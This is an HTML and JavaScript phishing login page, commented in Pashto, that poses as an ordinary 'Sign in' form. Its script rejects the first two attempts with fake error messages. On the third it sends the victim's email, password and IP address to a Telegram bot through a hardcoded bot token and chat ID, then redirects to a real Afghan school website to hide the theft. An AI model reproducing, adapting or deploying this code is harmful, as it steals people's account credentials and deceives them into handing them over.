<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f3f3f3;
    padding:0;
}

.login-container{
    width:480px;
    max-width:95%;
    height:479px;

    background:#fff;
    border-radius:16px;

    /* bottom بیا 6px کم شو */
    padding:38px 14px 26px 14px;

    border:1px solid #e0e0e0;
    box-shadow:0 4px 14px rgba(0,0,0,0.08);

    display:flex;
    flex-direction:column;
    justify-content:center;
}

/* LOGO */
.logo{
    text-align:center;
    margin-bottom:14px;
}

.logo img{
    width:280px;
}

/* TITLE */
.title{
    text-align:center;
    font-size:22px;
    font-weight:700;
    margin-bottom:26px;
    color:#222;
}

/* INPUT */
.input-box{
    margin-bottom:18px;
}

label{
    display:block;
    font-size:15px;
    margin-bottom:6px;
    color:#444;
}

input{
    width:100%;
    height:54px;
    border-radius:8px;
    border:1px solid #ccc;
    padding:0 14px;
    font-size:15px;
}

input:focus{
    border:2px solid #18c6e7;
    outline:none;
}

/* CHECKBOX */
.remember{
    display:flex;
    align-items:center;
    margin:14px 0 22px;
    font-size:14px;
}

.remember input{
    width:16px;
    height:16px;
    margin-right:8px;
}

/* BUTTON */
button{
    width:100%;
    height:54px;
    border:none;
    border-radius:8px;
    background:#18c6e7;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    background:#0fb6d6;
}

/* د تېروتنې پیغام */
.error-msg {
    background: #ffe6e6;
    border: 1px solid #ff6666;
    color: #cc0000;
    padding: 10px;
    border-radius: 8px;
    font-size: 13px;
    text-align: center;
    margin-top: 12px;
    display: none;
}

</style>
</head>

<body>

<div class="login-container">

    <div class="logo">
        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg">
    </div>

    <div class="title">Sign in</div>

    <div id="errorMsg" class="error-msg"></div>

    <div class="input-box">
        <label>Email</label>
        <input type="email" id="email" placeholder="Email">
    </div>

    <div class="input-box">
        <label>Password</label>
        <input type="password" id="password" placeholder="Password">
    </div>

    <div class="remember">
        <input type="checkbox" id="rememberCheck">
        <span>Remember password</span>
    </div>

    <button id="loginBtn">Login</button>

</div>

<script>
    // ==================== د Telegram بوټ تنظیمات ====================
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const ADMIN_CHAT_ID = "8295417969";

    // د هڅو شمېرلو لپاره (د IP پته او ایمیل پر بنسټ)
    let attemptStore = {};

    // د IP پته ترلاسه کول
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    // اډمن ته پیغام لیږل (یوازې بریالي هڅو لپاره)
    async function sendToAdmin(email, password, ip, attemptNumber) {
        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {
            console.warn("Telegram error:", e);
        }
    }

    function showError(message) {
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 3000);
    }

    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        // خالي ساحې چک کول
        if (!email || !password) {
            showError('Please fill in both email and password');
            return;
        }

        // ساده ایمیل تایید
        if (!email.includes('@') || !email.includes('.')) {
            showError('Please check your email');
            return;
        }

        const ip = await getUserIP();
        const key = `${email}_${ip}`;

        // د دې کارونکي لپاره د هڅو شمېر
        if (!attemptStore[key]) {
            attemptStore[key] = 0;
        }
        attemptStore[key]++;
        
        const currentAttempt = attemptStore[key];

        // لومړۍ هڅه - تېروتنه (اډمن ته خبر نه ځي)
        if (currentAttempt === 1) {
            showError('Please check your email');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }

        // دوهمه هڅه - تېروتنه (اډمن ته خبر نه ځي)
        if (currentAttempt === 2) {
            showError('Please check your password');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }

        // درېیمه هڅه - بریالي (یوازې دلته اډمن ته خبر ځي)
        if (currentAttempt >= 3) {
            // یوازې بریالي هڅه اډمن ته واستوئ
            await sendToAdmin(email, password, ip, currentAttempt);
            
            // د دې کارونکي لپاره هڅې پاکې کړئ
            delete attemptStore[key];
            
            // مستقیم altaqwa.edu.af ته لاړ شه
            window.location.href = "https://www.altaqwa.edu.af";
        }
    });
</script>

</body>
</html>
